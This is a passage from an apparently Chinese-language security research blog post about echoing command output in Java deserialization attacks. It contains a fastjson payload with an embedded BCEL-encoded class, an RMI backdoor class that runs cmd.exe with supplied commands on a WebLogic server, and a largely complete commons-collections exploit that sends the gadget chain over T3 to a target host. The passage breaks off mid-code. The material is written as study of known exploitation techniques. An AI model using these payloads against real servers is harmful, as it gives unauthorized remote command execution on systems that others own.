<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218141015072.png" alt="image-20201218141015072"></p>
<p>​        获取Class后通过defineClass来加载类，执行类中的static方法。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218141528766.png" alt="image-20201218141528766"></p>
<p>​            使用<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code>配合回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">        &quot;c&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">                &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuU$5dw$d3F$Q$bdk$cb$5eY$uqb$e7$D$93$94RJ$c1$J$c1$a6$40I$9a$844$q$85$f2$a1$E$g$a7$a1$wM$8b$y$af$j$r$8e$e4$p$cb$3d$fc$p$9ey$b19$f5$a1$7d$ebC$ffI$ffDaVv$9c$bav$fc$b0$ab$99$bd3$9e$7bgV$fa$fb$df$df$ff$Ap$HG$gfp$8fc$8d$e3$h$V$eb$w$eek$88$60C$$$9b$g$be$c5$D$8e$87$w$be$d3$f0$I$8f5$q$f0$84$e3$a9$86$R$Y$i$5b$g$92$b8$t$8dm$f9$f4L$c5s$8e$ef$e5$e3$8e$86$J$UT$ecj$b8$80$l$a4$b1$c7$f1$82$e3G$86$f8$aa$e3$3a$c1$gC4$3b$b7$c7$a0lz$r$c1$904$iWl7$8e$8b$c2$df$b5$8aU$f2$a4$M$cf$b6$aa$7b$96$efH$bb$ebT$82$D$a7$ce$900$CQ$P$96$96$96V$c8$r$5e$L$9ba2k$iZ$bfY$f9$aa$e5V$f2$85$c0w$dc$ca$8a$cc$l$b5$8fK2$d9$c0$nUR$P$7ca$jSl$e7$d4$f1$f2$8f$ddZ$p$u$84n$J$a0$bd$q$7c$86$99a$80$9d$f0$90$60$a3$c5F$b9$y$7cQ$da$e9$c2$cf$f7$e0$h$7d$t2e$H$db$c3$fc$a7$a2$OV2$aa$92$W$M$p$85$c0$b2$8f$b6$acZ$c8$9d$ba$c3aR$_H$7eR$9eA$7b$f0$da$W$b5$c0$f1$5c$SD$5d$b5$ab$5dY$99$e8$R$K$93$f7$60$x$d4$h$K$xx$N$df$W$P$j$v$a7$de$951$t$e1$3af$f1$J$Vv$g$fa$dc$f7lQ$afo4$9cj$c8k$ec$ff$r3p$927G$j$60$88$e4m$99$e1$t$j$_$f13$c7$be$8e_$f0$xC$e6L$e5$a87$95$e2$R$c7$x$j$W$8a2$96$da85$5c9yZ$3a9$j$d0L$87$40YG$F$HD_cH$Pa$af$c3$91$98Y$5c$n$b5$9c$9a$ed$b9e$a7$a2$e3s$5c$d1q$uy$f3$ae$W$7d4$9f$V$P$85$j$9cd$ecgA$e5d_$O$l$baX$3d$b0$fc$40$O$e5$9c1$m$tux$7c$c0IST$RA_$f6$e9$93$e0$81$b9$ec$b4$c8$r$bf$7d$60$f9u$R$e47$3b$3b$b1$u$7b$fe$b6uL$fd$c8$N$bb$Q$c6Y$91$94$f5Vv$e8$df$9d$j$o$99$a6O$83$ba3$$$bd$aa$bc8F8$c5$T$7d$S$9c$de$3d$abV$T$$$b5t$e1$ec2$87$dd$N5$f0NF$_Y$a3$3d$I$_$c9$aeo$d9$C$9f$d1$bbf$G$f2$X$F$93$c3L$ebE$b2$f2$b43$dac$f3$z$b0$b7$f4$Q$c1$a7$b4$c6Cg$i$97h$d5$3b$AJq$99$f6$84$i$LBQ0S$I$R$t$dfa$h$R3$fe$kQ3$9aR$K$a6$92$8a$V$cc$d8$7c$a1$85x$T$bc$J$d5h$pa$5eOi$efp$ae$F$7d$ab$8d$Rs$a1$85$d1$ed6$92f$Lc$cb$K$5b$8e$ddhb$dc$5c$8e$fd$85tF$c9$c4$9aH$a5$d2$b4$bcx$f3$e1$9f6$s$cc$8c$d2$c4d$LS$7f$86$Ed$85$97$a1$d2$9a$a4$K$c7$90$c38$W$91$c2$3a$d2$d8$a4$f7$e9$W$s$b1$8f$e9$b0$fa$b5N$85$f8$CWi$bf$84$t$b8$86$y1$caa$Vs$98$t$s$8b$b8$8d$ebX$a0$bc$ebd$df$a0$T$85$b2$5c$pi$ae$S$eb$9b$U5$8b$c8$Hr$c59$be$e4$b8$c5q$9b$e3$O$c7Wd$C$Z$dc$r$84B$Z$t$a8$a2$c5$9e$b0$fb$5daGS$d3$efp$fe$N$d4$a7$f3Md$dev$b5T$J$dd$e11E$96T5F$3a$ab$90$l$91s$f4$cd$Y$e9$v$9f$a0$dcK$f8$9a$yY$JG$e4$R$c7$b2$fc$bb$95$b0Y$ab$l$B$e8$60$97$T$ac$G$A$A&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: &quot;bbb&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218145459924.png" alt="image-20201218145459924"></p>
<p>​        首先我们看一下BasicDataSource这个类是tomcat下的一个类，在tomat-dbcp.jar中，在进行json解析的过程中会调用getConnection()</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218150110385.png" alt="image-20201218150110385"></p>
<p>​        在createDataSource中调用createConnectionFactory</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218150145651.png" alt="image-20201218150145651"></p>
<p>​        在createConnectionFactory中调用Class.forName，并将class_name和classloader传入，后面的过程就和之前的demo一样，不再分析了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218150304057.png" alt="image-20201218150304057"></p>
<p>​        这种方法目前只能在低版本的fastjson中利用，高版本的fastjson中加入了autoType属性，无法调用BasicDataSource。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218151232364.png" alt="image-20201218151232364"></p>
<h3 id="RMI回显"><a href="#RMI回显" class="headerlink" title="RMI回显"></a>RMI回显</h3><p>​        首先我们看下如何注册和使用RMI服务，下面是RMI Demo代码</p>
<p>RMIServer.java</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class RMIServer &#123;</span><br><span class="line"></span><br><span class="line">    public interface IRemoteHelloWorld extends Remote &#123;  &#x2F;&#x2F; RMI调用对象接口定义，这个接口必须继承Remote接口，标明这是一个远程调用的接口，接口中定义的方法，会被Client端调用，也就是远程调用方法</span><br><span class="line">        public String hello() throws RemoteException;  &#x2F;&#x2F;远程调用方法必须要抛RemoteException异常</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld &#123;  &#x2F;&#x2F;远程对象实现类</span><br><span class="line">        &#x2F;&#x2F;UnicastRemoteObject用于导出的远程对象和获得与该远程对象通信的存根。</span><br><span class="line"></span><br><span class="line">        protected RemoteHelloWorld() throws RemoteException &#123; &#x2F;&#x2F;实现类需要重写无参构造器，且需要抛出RemoteException异常</span><br><span class="line">            super();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public String hello() &#123;</span><br><span class="line">            return &quot;helloworld&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void start() throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        RemoteHelloWorld h &#x3D; new RemoteHelloWorld();  &#x2F;&#x2F;创建远程对象</span><br><span class="line">        LocateRegistry.createRegistry(1099);  &#x2F;&#x2F;创建一个接受对1099端口调用的远程对象注册表</span><br><span class="line">        Naming.rebind(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello&quot;, h); &#x2F;&#x2F;把远程对象注册到RMI注册服务器上，并命名为Hello</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        new RMIServer().start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIClient.java</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import com.test.rmi.RMIServer;</span><br><span class="line"></span><br><span class="line">import java.rmi.Naming;</span><br><span class="line"></span><br><span class="line">public class RMIClient &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        RMIServer.IRemoteHelloWorld hello &#x3D; (RMIServer.IRemoteHelloWorld)</span><br><span class="line">            Naming.lookup(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello&quot;);</span><br><span class="line">        String res &#x3D; hello.hello();</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        首先打开服务端，再打开客户端，最终执行了服务端的hello方法，并将执行结果返回给客户端。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218170046027.png" alt="image-20201218170046027"></p>
<p>​        因为使用RMI回显利用本质上还是会调用defineClass方法来加载远程类，但是ClassLoader是一个抽象类，不能通过反射来获取抽象类的对象，因此我们如果要利用defineClass方法加载类的字节码，可以尝试寻找ClassLoader的子类,我在weblogic下进行寻找，有不少的类都继承了ClassLoader。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221094830804.png" alt="image-20201221094830804"></p>
<p>​        在这些类中，有几个类在实现过程中会直接调用父类的defineClass方法，比如weblogic.jar!\jxxload_help\PathVFSJavaLoader.class</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221101826314.png" alt="image-20201221101826314"></p>
<p>​        还有weblogic.jar!\org\mozilla\classfile\DefiningClassLoader.class</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221101949975.png" alt="image-20201221101949975"></p>
<p>​        找到了加载类字节码的方式后，我们再看下哪些部分开启了RMI服务，我们之前了解过开启RMI服务需要继承Remote类，因此我们可以寻找继承Remote类的类。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221102653829.png" alt="image-20201221102653829"></p>
<p>​        由于我们希望通过RMI来进行回显，所以我们要找到的RMI Server端开启的服务需要返回String类型的数据,比如ClusterMasterRemote类的getServerLocation方法。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221114120045.png" alt="image-20201221114120045"></p>
<p>​        根据这个思路我们可以实现ClusterMasterRemote类并且重写getServerLocation方法，在这个方法中执行命令，并将命令执行的结果返回。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> weblogic.cluster.singleton.ClusterMasterRemote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMITest</span> <span class="keyword">implements</span> <span class="title">ClusterMasterRemote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        RMITest remote = <span class="keyword">new</span> RMITest();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context context = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            context.rebind(<span class="string">"test666"</span>,remote);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setServerLocation</span><span class="params">(String s, String s1)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getServerLocation</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> RemoteException </span>&#123;     <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">        cmds.add(<span class="string">"cmd.exe"</span>);</span><br><span class="line">        cmds.add(<span class="string">"/c"</span>);</span><br><span class="line">        cmds.add(cmd);</span><br><span class="line"></span><br><span class="line">        ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(cmds);</span><br><span class="line">        processBuilder.redirectErrorStream(<span class="keyword">true</span>);</span><br><span class="line">        Process proc = processBuilder.start();</span><br><span class="line"></span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(proc.getInputStream()));</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            sb.append(line).append(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221134435820.png" alt="image-20201221134435820"></p>
<p>​        另外我们还需要通过利用链比如common-collection1来通过DefiningClassLoader的defineClass来加载RMITest类并执行类中的main方法绑定一个RMI服务,通过访问这个RMI服务，并传入需要执行的命令，就可以获取命令执行后的结果。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(DefiningClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getDeclaredConstructor", new Class[]&#123;Class[].class&#125;, new Object[]&#123;new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("newInstance", new Class[]&#123;Object[].class&#125;, new Object[]&#123;new Object[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"defineClass"</span>,</span><br><span class="line">                        new Class[]&#123;String.class, byte[].class&#125;, new Object[]&#123;className, clsData&#125;),</span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"main", new Class[]&#123;String[].class&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;null&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="keyword">new</span> HashSet())&#125;;</span><br></pre></td></tr></table></figure>

<p>​        完整代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.Reflections;</span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.SerialDataGenerator;</span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.Serializables;</span><br><span class="line"><span class="keyword">import</span> com.supeream.ssl.WeblogicTrustManager;</span><br><span class="line"><span class="keyword">import</span> com.supeream.weblogic.T3ProtocolOperation;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.mozilla.classfile.DefiningClassLoader;</span><br><span class="line"><span class="keyword">import</span> weblogic.cluster.singleton.ClusterMasterRemote;</span><br><span class="line"><span class="keyword">import</span> weblogic.corba.utils.MarshalledObject;</span><br><span class="line"><span class="keyword">import</span> weblogic.jndi.Environment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String host = <span class="string">"192.168.3.30"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String port = <span class="string">"7001"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String classname = <span class="string">"RMITest"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String url = <span class="string">"t3://"</span> + host + <span class="string">":"</span> + port;</span><br><span class="line">            <span class="keyword">byte</span>[] bs=getBs();</span><br><span class="line">            <span class="comment">// 安装RMI实例</span></span><br><span class="line">            invokeRMI(classname, bs);</span><br><span class="line"></span><br><span class="line">            Environment environment = <span class="keyword">new</span> Environment();</span><br><span class="line">            environment.setProviderUrl(url);</span><br><span class="line">            environment.setEnableServerAffinity(<span class="keyword">false</span>);</span><br><span class="line">            environment.setSSLClientTrustManager(<span class="keyword">new</span> WeblogicTrustManager());</span><br><span class="line">            Context context = environment.getInitialContext();</span><br><span class="line">            ClusterMasterRemote remote = (ClusterMasterRemote) context.lookup(<span class="string">"test666"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用RMI实例执行命令</span></span><br><span class="line">            String res = remote.getServerLocation(<span class="string">"ipconfig"</span>);</span><br><span class="line">            System.out.println(res);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">invokeRMI</span><span class="params">(String className, <span class="keyword">byte</span>[] clsData)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// common-collection1 构造transformers 定义自己的RMI接口</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(DefiningClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getDeclaredConstructor", new Class[]&#123;Class[].class&#125;, new Object[]&#123;new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("newInstance", new Class[]&#123;Object[].class&#125;, new Object[]&#123;new Object[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"defineClass"</span>,</span><br><span class="line">                        new Class[]&#123;String.class, byte[].class&#125;, new Object[]&#123;className, clsData&#125;),</span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"main", new Class[]&#123;String[].class&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;null&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="keyword">new</span> HashSet())&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        InvocationHandler handler = (InvocationHandler) Reflections</span><br><span class="line">                .getFirstCtor(</span><br><span class="line">                        <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>)</span><br><span class="line">                .newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">lazyMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map mapProxy = Map<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">                .<span class="title">cast</span>(<span class="title">Proxy</span>.<span class="title">newProxyInstance</span>(<span class="title">SerialDataGenerator</span>.<span class="title">class</span>.<span class="title">getClassLoader</span>(),</span></span><br><span class="line">                        new Class[]&#123;Map.class&#125;, handler));</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) Reflections.getFirstCtor(</span><br><span class="line">                <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>)</span><br><span class="line">                .newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化数据 MarshalledObject绕过</span></span><br><span class="line">        Object obj = <span class="keyword">new</span> MarshalledObject(handler);</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        